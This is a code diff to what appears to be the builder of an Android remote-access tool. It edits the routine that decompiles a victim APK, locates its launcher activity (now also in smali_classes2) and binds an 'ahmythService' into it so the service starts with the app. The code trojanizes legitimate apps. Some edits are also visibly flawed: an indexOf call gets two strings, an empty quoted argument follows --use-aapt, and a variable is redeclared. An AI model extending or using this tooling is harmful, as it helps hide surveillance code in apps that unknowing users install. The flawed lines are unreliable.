@@ -101,6 +101,8 @@ app.controller("AppCtrl", ($scope) => {
             fontColor = CONSTANTS.logColors.GREEN;
         else if (status == CONSTANTS.logStatus.FAIL)
             fontColor = CONSTANTS.logColors.RED;
+        else if (status == CONSTANTS.logStatus.INFO)
+            fontColor = CONSTANTS.logColors.YELLOW; 
 
         $appCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
         log.scrollTop = log.scrollHeight;
@@ -5517,8 +5519,13 @@ app.controller("AppCtrl", ($scope) => {
 
             var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali/"));
             if (launcherPath == -1) {
-                $appCtrl.Log("Cannot find the launcher activity , try the other binding method.", CONSTANTS.logStatus.FAIL);
+              var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali_classes2/"));
+              if (launcherPath == -1) {
+                $appCtrl.Log("Cannot find the launcher activity,", CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log("Please check the app by running", CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log("aapt d badging 'path-to-your.apk' | grep launchable-activity", CONSTANTS.logStatus.INFO)
                 return;
+              }
             }
 
             var ahmythService = CONSTANTS.ahmythService;
@@ -5544,7 +5551,7 @@ app.controller("AppCtrl", ($scope) => {
                     }
 
 
-                    var startService = CONSTANTS.serviceSrc + launcherPath.substring(launcherPath.indexOf("smali/") + 6, launcherPath.indexOf(".smali")) + CONSTANTS.serviceStart;
+                    var startService = CONSTANTS.serviceSrc + launcherPath.substring(launcherPath.indexOf("smali/", "smali_classes2/") + 6, launcherPath.indexOf(".smali")) + CONSTANTS.serviceStart;
 
 
                     var key = CONSTANTS.orgAppKey;
@@ -5618,7 +5625,7 @@ app.controller("AppCtrl", ($scope) => {
 
                     var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                     $appCtrl.Log('Decompiling ' + filePath + "...");
-                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
+                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" --use-aapt "' + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
                         (error, stdout, stderr) => {
                             if (error !== null) {
                                 $appCtrl.Log('Decompilation Failed', CONSTANTS.logStatus.FAIL);
